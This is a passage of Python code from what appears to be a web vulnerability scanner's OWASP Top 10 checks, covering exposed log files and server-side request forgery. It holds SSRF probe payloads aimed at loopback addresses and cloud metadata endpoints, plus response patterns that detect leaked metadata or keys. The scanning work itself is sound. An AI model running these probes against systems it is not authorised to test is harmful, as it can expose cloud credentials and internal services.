                if any(s in r.text.lower() for s in [
                    "error", "exception",
                    "warning", "info", "debug",
                    "get /", "post /"
                ]):
                    self._add(
                        "A09",
                        "Security Logging and Monitoring Failures",
                        "HIGH",
                        f"Log File Exposed: {path}",
                        f"Log file at {path} is publicly accessible. "
                        "Logs may contain user data, credentials, "
                        "API keys, and internal paths.",
                        evidence=(
                            f"GET {self.base}{path} → 200 "
                            f"({len(r.text)} bytes)"
                        ),
                        fix="Move log files outside web root. "
                            "Restrict access with .htaccess. "
                            "Implement log rotation and archiving.",
                        cwe="CWE-532", cvss="7.5"
                    )

    # ────────────────────────────────────────────────────────── #
    #  A10 — SERVER-SIDE REQUEST FORGERY (SSRF)
    # ────────────────────────────────────────────────────────── #
    def check_a10_ssrf(self, resp):
        print("[A10] Checking SSRF...")

        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",
            "http://[::1]",
            "http://0.0.0.0",
        ]
        ssrf_params = [
            "url", "redirect", "proxy", "fetch",
            "src", "href", "load", "request",
            "image", "file", "path", "resource",
        ]
        ssrf_signs = [
            "root:", "localhost", "127.0.0.1",
            "internal", "metadata", "ami-id",
            "instance-id", "ssh-rsa",
        ]

        for param in ssrf_params:
            for payload in ssrf_payloads[:3]:
                p = urlparse(self.target)
                test_url = urlunparse((
                    p.scheme, p.netloc, p.path,
                    "", f"{param}={payload}", ""
                ))
                r = self._get(test_url)
                if r and any(
                    s in r.text.lower()
                    for s in ssrf_signs
                ):
                    self._add(
                        "A10", "Server-Side Request Forgery",
                        "CRITICAL",
                        "Server-Side Request Forgery (SSRF)",
                        f"SSRF via parameter '{param}'. "
                        "Server is making requests to internal "
                        "addresses. Cloud metadata, internal APIs, "
                        "and file system may be accessible.",
                        evidence=(
                            f"?{param}={payload} "
                            "→ internal data in response"
                        ),
                        fix="Validate and whitelist allowed URLs. "
                            "Block requests to private IP ranges. "
                            "Use allowlist of permitted domains. "
                            "Disable URL fetch features if unused.",
                        cwe="CWE-918", cvss="9.8"
                    )
                    return

        # Also test via POST body
        for param in ssrf_params[:5]:
            for payload in ssrf_payloads[:2]:
                r = self._post(
                    self.target,
                    json_data={param: payload}
                )
                if r and any(
                    s in r.text.lower()
                    for s in ssrf_signs
                ):
                    self._add(
                        "A10", "Server-Side Request Forgery",
                        "CRITICAL",
                        "SSRF via POST Parameter",
                        f"SSRF via POST parameter '{param}'. "
                        "Internal network access confirmed.",
                        evidence=(
                            f"POST {param}={payload} "
                            "→ internal response"
                        ),
                        fix="Validate all user-supplied URLs. "
                            "Block SSRF via network-level controls. "
                            "Use metadata service IMDSv2.",
                        cwe="CWE-918", cvss="9.8"
                    )
                    return
